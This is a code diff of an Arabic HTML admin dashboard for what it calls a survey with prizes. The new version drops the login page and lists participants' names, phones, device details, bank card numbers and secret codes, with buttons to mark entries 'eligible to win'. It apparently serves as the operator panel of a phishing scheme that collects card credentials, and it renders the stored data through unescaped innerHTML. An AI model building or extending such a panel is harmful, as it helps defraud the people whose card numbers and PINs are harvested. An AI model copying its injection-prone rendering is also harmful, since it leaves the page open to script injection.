@@ -3,111 +3,713 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم المدير - استبيان الخدمات المالية</title>
-    <link rel="stylesheet" href="css/admin.css">
+    <title>لوحة التحكم - الاستبيانات</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="icon" type="image/x-icon" href="assets/logo.png">
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+        }
+        
+        body { 
+            background: #f5f7fa; 
+            padding: 20px; 
+            color: #333; 
+        }
+        
+        .container { 
+            max-width: 1200px; 
+            margin: 0 auto; 
+        }
+        
+        header { 
+            background: white; 
+            padding: 25px; 
+            border-radius: 15px; 
+            margin-bottom: 25px; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border-right: 5px solid #667eea;
+        }
+        
+        header h1 { 
+            color: #4a5568; 
+            margin-bottom: 10px; 
+        }
+        
+        header p { 
+            color: #718096; 
+        }
+        
+        .stats { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); 
+            gap: 20px; 
+            margin-bottom: 30px; 
+        }
+        
+        .stat-card { 
+            background: white; 
+            padding: 25px; 
+            border-radius: 15px; 
+            text-align: center; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            transition: transform 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .stat-card h3 { 
+            color: #4a5568; 
+            margin-bottom: 15px; 
+            font-size: 16px;
+        }
+        
+        .stat-card .number { 
+            font-size: 42px; 
+            font-weight: bold; 
+            margin: 10px 0;
+        }
+        
+        .stat-card.pending { 
+            border-top: 4px solid #f59e0b; 
+        }
+        
+        .stat-card.pending .number { 
+            color: #f59e0b; 
+        }
+        
+        .stat-card.approved { 
+            border-top: 4px solid #10b981; 
+        }
+        
+        .stat-card.approved .number { 
+            color: #10b981; 
+        }
+        
+        .stat-card.rejected { 
+            border-top: 4px solid #ef4444; 
+        }
+        
+        .stat-card.rejected .number { 
+            color: #ef4444; 
+        }
+        
+        .stat-card.total { 
+            border-top: 4px solid #667eea; 
+        }
+        
+        .stat-card.total .number { 
+            color: #667eea; 
+        }
+        
+        .device-stats {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .device-stats h3 {
+            color: #4a5568;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .device-items {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .device-item {
+            background: #f8fafc;
+            padding: 15px;
+            border-radius: 10px;
+            flex: 1;
+            min-width: 150px;
+            text-align: center;
+            border-left: 4px solid #8b5cf6;
+        }
+        
+        .device-item .device-name {
+            font-weight: bold;
+            color: #4c1d95;
+            margin-bottom: 5px;
+        }
+        
+        .device-item .device-count {
+            font-size: 24px;
+            font-weight: bold;
+            color: #7c3aed;
+        }
+        
+        .surveys-list { 
+            background: white; 
+            padding: 25px; 
+            border-radius: 15px; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .list-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .list-header h2 {
+            color: #4a5568;
+        }
+        
+        .refresh-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .refresh-btn:hover {
+            background: #5a67d8;
+        }
+        
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+        }
+        
+        th, td { 
+            padding: 15px; 
+            text-align: right; 
+            border-bottom: 1px solid #e2e8f0; 
+        }
+        
+        th { 
+            background: #f8fafc; 
+            color: #4a5568;
+            font-weight: 600;
+        }
+        
+        tr:hover {
+            background: #f8fafc;
+        }
+        
+        .status { 
+            padding: 6px 12px; 
+            border-radius: 20px; 
+            font-size: 13px; 
+            font-weight: 500;
+        }
+        
+        .status-pending { 
+            background: #fef3c7; 
+            color: #92400e; 
+        }
+        
+        .status-approved { 
+            background: #d1fae5; 
+            color: #065f46; 
+        }
+        
+        .status-rejected { 
+            background: #fee2e2; 
+            color: #991b1b; 
+        }
+        
+        .actions { 
+            display: flex; 
+            gap: 8px; 
+        }
+        
+        .actions button { 
+            padding: 6px 12px; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: all 0.3s;
+        }
+        
+        .approve-btn { 
+            background: #10b981; 
+            color: white; 
+        }
+        
+        .approve-btn:hover {
+            background: #0da271;
+        }
+        
+        .reject-btn { 
+            background: #ef4444; 
+            color: white; 
+        }
+        
+        .reject-btn:hover {
+            background: #dc2626;
+        }
+        
+        .view-btn {
+            background: #3b82f6;
+            color: white;
+        }
+        
+        .view-btn:hover {
+            background: #2563eb;
+        }
+        
+        .device-info {
+            font-size: 12px;
+            color: #718096;
+            margin-top: 5px;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #a0aec0;
+        }
+        
+        .last-updated {
+            text-align: left;
+            color: #a0aec0;
+            font-size: 14px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        @media (max-width: 768px) {
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .device-items {
+                flex-direction: column;
+            }
+            
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+            
+            .actions {
+                flex-direction: column;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .stats {
+                grid-template-columns: 1fr;
+            }
+            
+            header, .surveys-list {
+                padding: 15px;
+            }
+        }
+    </style>
 </head>
 <body>
-    <!-- صفحة تسجيل الدخول -->
-    <div id="login-page" class="page active">
-        <div class="login-container">
-            <div class="login-header">
-                <img src="assets/logo.png" alt="شعار" class="login-logo">
-                <h2>تسجيل دخول المدير</h2>
-                <p>أدخل بيانات الاعتماد للوصول</p>
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-tachometer-alt"></i> لوحة تحكم الاستبيانات</h1>
+            <p>مرحباً بك في نظام إدارة الاستبيانات - تحديث تلقائي كل 10 ثواني</p>
+        </header>
+        
+        <div class="stats">
+            <div class="stat-card total">
+                <h3><i class="fas fa-users"></i> إجمالي المشاركين</h3>
+                <div class="number" id="total">0</div>
+                <p>جميع المشاركات</p>
+            </div>
+            <div class="stat-card pending">
+                <h3><i class="fas fa-clock"></i> قيد المراجعة</h3>
+                <div class="number" id="pending">0</div>
+                <p>بانتظار القبول/الرفض</p>
+            </div>
+            <div class="stat-card approved">
+                <h3><i class="fas fa-check-circle"></i> المقبولة</h3>
+                <div class="number" id="approved">0</div>
+                <p>مؤهلة للفوز</p>
+            </div>
+            <div class="stat-card rejected">
+                <h3><i class="fas fa-times-circle"></i> المرفوضة</h3>
+                <div class="number" id="rejected">0</div>
+                <p>غير مؤهلة</p>
+            </div>
+        </div>
+        
+        <div class="device-stats">
+            <h3><i class="fas fa-mobile-alt"></i> توزيع الأجهزة</h3>
+            <div class="device-items" id="device-stats">
+                <!-- يتم تعبئته بالجافاسكريبت -->
+            </div>
+        </div>
+        
+        <div class="surveys-list">
+            <div class="list-header">
+                <h2><i class="fas fa-list"></i> الاستبيانات المعلقة</h2>
+                <button onclick="loadSurveys()" class="refresh-btn">
+                    <i class="fas fa-sync-alt"></i> تحديث
+                </button>
             </div>
             
-            <form id="login-form" class="login-form">
-                <div class="form-group">
-                    <label><i class="fas fa-user"></i> اسم المستخدم</label>
-                    <input type="text" id="username" placeholder="admin" required>
-                </div>
+            <div id="surveys-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>رقم المشاركة</th>
+                            <th>الاسم</th>
+                            <th>الهاتف</th>
+                            <th>الجهاز</th>
+                            <th>التاريخ</th>
+                            <th>الحالة</th>
+                            <th>الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody id="surveysBody">
+                        <!-- يتم تعبئة البيانات هنا -->
+                    </tbody>
+                </table>
                 
-                <div class="form-group">
-                    <label><i class="fas fa-lock"></i> كلمة المرور</label>
-                    <input type="password" id="password" placeholder="••••••••" required>
+                <div id="no-data" class="no-data" style="display: none;">
+                    <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i>
+                    <h3>لا توجد استبيانات معلقة</h3>
+                    <p>جميع الاستبيانات تمت مراجعتها</p>
                 </div>
-                
-                <button type="submit" class="btn-login">
-                    <i class="fas fa-sign-in-alt"></i> تسجيل الدخول
-                </button>
-            </form>
+            </div>
+            
+            <div class="last-updated">
+                <i class="fas fa-clock"></i> آخر تحديث: <span id="last-updated">--:--:--</span>
+            </div>
         </div>
     </div>
 
-    <!-- لوحة التحكم -->
-    <div id="dashboard-page" class="page">
-        <header class="dashboard-header">
-            <div class="header-left">
-                <button class="menu-toggle">
-                    <i class="fas fa-bars"></i>
-                </button>
-                <h2>لوحة التحكم</h2>
+    <!-- نافذة عرض التفاصيل -->
+    <div id="details-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center;">
+        <div style="background: white; padding: 30px; border-radius: 15px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h3 style="color: #4a5568;"><i class="fas fa-info-circle"></i> تفاصيل المشاركة</h3>
+                <button onclick="closeModal()" style="background: none; border: none; font-size: 24px; cursor: pointer; color: #718096;">&times;</button>
             </div>
-            
-            <div class="header-right">
-                <button onclick="logout()" class="btn-logout">
-                    <i class="fas fa-sign-out-alt"></i> تسجيل الخروج
+            <div id="modal-content"></div>
+            <div style="margin-top: 20px; display: flex; gap: 10px; justify-content: flex-end;">
+                <button onclick="approveSelected()" style="background: #10b981; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
+                    <i class="fas fa-check"></i> قبول
+                </button>
+                <button onclick="rejectSelected()" style="background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
+                    <i class="fas fa-times"></i> رفض
+                </button>
+                <button onclick="closeModal()" style="background: #718096; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
+                    إغلاق
                 </button>
             </div>
-        </header>
-        
-        <main class="dashboard-main">
-            <!-- إحصائيات -->
-            <section class="stats-section">
-                <div class="stat-card">
-                    <i class="fas fa-users"></i>
-                    <div class="stat-info">
-                        <h3 id="admin-total-participants">0</h3>
-                        <p>إجمالي المشاركين</p>
-                    </div>
-                </div>
-                
-                <div class="stat-card">
-                    <i class="fas fa-check-circle"></i>
-                    <div class="stat-info">
-                        <h3 id="today-participants">0</h3>
-                        <p>مشاركات اليوم</p>
-                    </div>
-                </div>
-            </section>
-            
-            <!-- المشاركين -->
-            <section class="participants-section">
-                <div class="section-header">
-                    <h3>آخر المشاركين</h3>
-                    <button onclick="refreshData()" class="btn-refresh">
-                        <i class="fas fa-redo"></i> تحديث
-                    </button>
-                </div>
-                
-                <div class="table-container">
-                    <table class="data-table">
-                        <thead>
-                            <tr>
-                                <th>رقم المشاركة</th>
-                                <th>رقم الهاتف</th>
-                                <th>التاريخ</th>
-                                <th>الحالة</th>
-                            </tr>
-                        </thead>
-                        <tbody id="participants-table">
-                            <!-- سيتم تعبئتها بالبيانات -->
-                        </tbody>
-                    </table>
-                </div>
-            </section>
-        </main>
+        </div>
     </div>
 
-    <!-- الإشعارات -->
-    <div id="admin-notification" class="notification"></div>
-
-    <!-- Scripts -->
-    <script src="js/config.js"></script>
-    <script src="js/database.js"></script>
-    <script src="js/admin.js"></script>
+    <script>
+        let selectedSurveyId = null;
+        
+        // تحميل البيانات من localStorage
+        function loadSurveys() {
+            try {
+                const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
+                
+                // تحديث الإحصائيات
+                document.getElementById('total').textContent = surveys.length;
+                
+                const pending = surveys.filter(s => s.status === 'pending').length;
+                const approved = surveys.filter(s => s.status === 'approved').length;
+                const rejected = surveys.filter(s => s.status === 'rejected').length;
+                
+                document.getElementById('pending').textContent = pending;
+                document.getElementById('approved').textContent = approved;
+                document.getElementById('rejected').textContent = rejected;
+                
+                // تحديث إحصائيات الأجهزة
+                updateDeviceStats(surveys);
+                
+                // عرض الجدول
+                const tbody = document.getElementById('surveysBody');
+                const noDataDiv = document.getElementById('no-data');
+                
+                if (pending === 0) {
+                    tbody.innerHTML = '';
+                    noDataDiv.style.display = 'block';
+                    document.querySelector('table').style.display = 'none';
+                } else {
+                    document.querySelector('table').style.display = 'table';
+                    noDataDiv.style.display = 'none';
+                    tbody.innerHTML = '';
+                    
+                    const pendingSurveys = surveys.filter(s => s.status === 'pending');
+                    
+                    pendingSurveys.forEach(survey => {
+                        const deviceInfo = survey.deviceInfo || {};
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td><strong>${survey.id}</strong></td>
+                            <td>${survey.name}</td>
+                            <td dir="ltr">${survey.phone}</td>
+                            <td>
+                                ${deviceInfo.type || 'غير معروف'}
+                                <div class="device-info">
+                                    ${deviceInfo.browser || ''} ${deviceInfo.os ? ' | ' + deviceInfo.os : ''}
+                                </div>
+                            </td>
+                            <td>${survey.date}</td>
+                            <td><span class="status status-pending">قيد المراجعة</span></td>
+                            <td class="actions">
+                                <button class="view-btn" onclick="viewDetails('${survey.id}')">
+                                    <i class="fas fa-eye"></i> عرض
+                                </button>
+                                <button class="approve-btn" onclick="approveSurvey('${survey.id}')">
+                                    <i class="fas fa-check"></i> قبول
+                                </button>
+                                <button class="reject-btn" onclick="rejectSurvey('${survey.id}')">
+                                    <i class="fas fa-times"></i> رفض
+                                </button>
+                            </td>
+                        `;
+                        tbody.appendChild(row);
+                    });
+                }
+                
+                // تحديث وقت التحديث
+                document.getElementById('last-updated').textContent = new Date().toLocaleTimeString('ar-SA');
+                
+            } catch (error) {
+                console.error('خطأ في تحميل البيانات:', error);
+                showMessage('خطأ في تحميل البيانات', 'error');
+            }
+        }
+        
+        // تحديث إحصائيات الأجهزة
+        function updateDeviceStats(surveys) {
+            const deviceStats = {};
+            
+            surveys.forEach(survey => {
+                const deviceType = survey.deviceInfo?.type || 'غير معروف';
+                deviceStats[deviceType] = (deviceStats[deviceType] || 0) + 1;
+            });
+            
+            const deviceContainer = document.getElementById('device-stats');
+            deviceContainer.innerHTML = '';
+            
+            Object.entries(deviceStats).forEach(([type, count]) => {
+                const icon = type === 'كمبيوتر' ? '💻' : type === 'تابلت' ? '📟' : '📱';
+                const deviceItem = document.createElement('div');
+                deviceItem.className = 'device-item';
+                deviceItem.innerHTML = `
+                    <div class="device-name">${icon} ${type}</div>
+                    <div class="device-count">${count}</div>
+                    <small>${Math.round((count / surveys.length) * 100)}% من المشاركين</small>
+                `;
+                deviceContainer.appendChild(deviceItem);
+            });
+        }
+        
+        // عرض تفاصيل الاستبيان
+        function viewDetails(surveyId) {
+            const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
+            const survey = surveys.find(s => s.id === surveyId);
+            
+            if (!survey) {
+                showMessage('لم يتم العثور على الاستبيان', 'error');
+                return;
+            }
+            
+            selectedSurveyId = surveyId;
+            
+            const deviceInfo = survey.deviceInfo || {};
+            const modalContent = document.getElementById('modal-content');
+            
+            modalContent.innerHTML = `
+                <div style="background: #f8fafc; padding: 20px; border-radius: 10px; margin-bottom: 15px;">
+                    <h4 style="color: #4a5568; margin-bottom: 15px; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">
+                        <i class="fas fa-user"></i> المعلومات الشخصية
+                    </h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">الاسم الكامل</label>
+                            <p style="font-weight: bold; margin-top: 5px;">${survey.name}</p>
+                        </div>
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">رقم الهاتف</label>
+                            <p dir="ltr" style="font-weight: bold; margin-top: 5px;">${survey.phone}</p>
+                        </div>
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">رقم البطاقة</label>
+                            <p dir="ltr" style="font-weight: bold; margin-top: 5px;">${survey.card}</p>
+                        </div>
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">الرمز السري</label>
+                            <p style="font-weight: bold; margin-top: 5px; font-family: monospace;">${survey.code}</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="background: #f0f9ff; padding: 20px; border-radius: 10px; margin-bottom: 15px;">
+                    <h4 style="color: #4a5568; margin-bottom: 15px; border-bottom: 2px solid #bae6fd; padding-bottom: 10px;">
+                        <i class="fas fa-mobile-alt"></i> معلومات الجهاز
+                    </h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">نوع الجهاز</label>
+                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.type || 'غير معروف'}</p>
+                        </div>
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">المتصفح</label>
+                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.browser || 'غير معروف'}</p>
+                        </div>
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">نظام التشغيل</label>
+                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.os || 'غير معروف'}</p>
+                        </div>
+                        <div>
+                            <label style="color: #718096; font-size: 14px;">مقاس الشاشة</label>
+                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.screenWidth || 0}×${deviceInfo.screenHeight || 0}</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="background: #f7fee7; padding: 20px; border-radius: 10px;">
+                    <h4 style="color: #4a5568; margin-bottom: 15px; border-bottom: 2px solid #d9f99d; padding-bottom: 10px;">
+                        <i class="fas fa-info-circle"></i> معلومات إضافية
+                    </h4>
+                    <div>
+                        <label style="color: #718096; font-size: 14px;">رقم المشاركة</label>
+                        <p style="font-weight: bold; margin-top: 5px; font-family: monospace;">${survey.id}</p>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <label style="color: #718096; font-size: 14px;">تاريخ المشاركة</label>
+                        <p style="font-weight: bold; margin-top: 5px;">${survey.date}</p>
+                    </div>
+                </div>
+            `;
+            
+            document.getElementById('details-modal').style.display = 'flex';
+        }
+        
+        // إغلاق النافذة
+        function closeModal() {
+            document.getElementById('details-modal').style.display = 'none';
+            selectedSurveyId = null;
+        }
+        
+        // قبول استبيان
+        function approveSurvey(id) {
+            if (!confirm(`هل تريد قبول المشاركة ${id}؟`)) return;
+            
+            const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
+            const index = surveys.findIndex(s => s.id === id);
+            
+            if (index !== -1) {
+                surveys[index].status = 'approved';
+                surveys[index].reviewed_by = 'المدير (ويب)';
+                surveys[index].reviewed_at = new Date().toLocaleString('ar-SA');
+                localStorage.setItem('participants', JSON.stringify(surveys));
+                
+                showMessage(`✅ تم قبول المشاركة ${id}`);
+                loadSurveys();
+                closeModal();
+            }
+        }
+        
+        // رفض استبيان
+        function rejectSurvey(id) {
+            if (!confirm(`هل تريد رفض المشاركة ${id}؟`)) return;
+            
+            const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
+            const index = surveys.findIndex(s => s.id === id);
+            
+            if (index !== -1) {
+                surveys[index].status = 'rejected';
+                surveys[index].reviewed_by = 'المدير (ويب)';
+                surveys[index].reviewed_at = new Date().toLocaleString('ar-SA');
+                localStorage.setItem('participants', JSON.stringify(surveys));
+                
+                showMessage(`❌ تم رفض المشاركة ${id}`);
+                loadSurveys();
+                closeModal();
+            }
+        }
+        
+        // قبول من النافذة
+        function approveSelected() {
+            if (selectedSurveyId) {
+                approveSurvey(selectedSurveyId);
+            }
+        }
+        
+        // رفض من النافذة
+        function rejectSelected() {
+            if (selectedSurveyId) {
+                rejectSurvey(selectedSurveyId);
+            }
+        }
+        
+        // عرض رسالة
+        function showMessage(text, type = 'success') {
+            // إنشاء عنصر الرسالة
+            const messageEl = document.createElement('div');
+            messageEl.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: ${type === 'success' ? '#10b981' : '#ef4444'};
+                color: white;
+                padding: 15px 20px;
+                border-radius: 10px;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+                z-index: 1001;
+                animation: slideIn 0.3s;
+            `;
+            messageEl.textContent = text;
+            
+            document.body.appendChild(messageEl);
+            
+            setTimeout(() => {
+                messageEl.style.animation = 'slideOut 0.3s';
+                setTimeout(() => {
+                    document.body.removeChild(messageEl);
+                }, 300);
+            }, 3000);
+        }
+        
+        // تحديث تلقائي كل 10 ثواني
+        setInterval(loadSurveys, 10000);
+        
+        // تحميل البيانات عند البدء
+        document.addEventListener('DOMContentLoaded', loadSurveys);
+        
+        // إضافة أنيميشن CSS
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(100%); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(100%); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
 </body>
 </html>
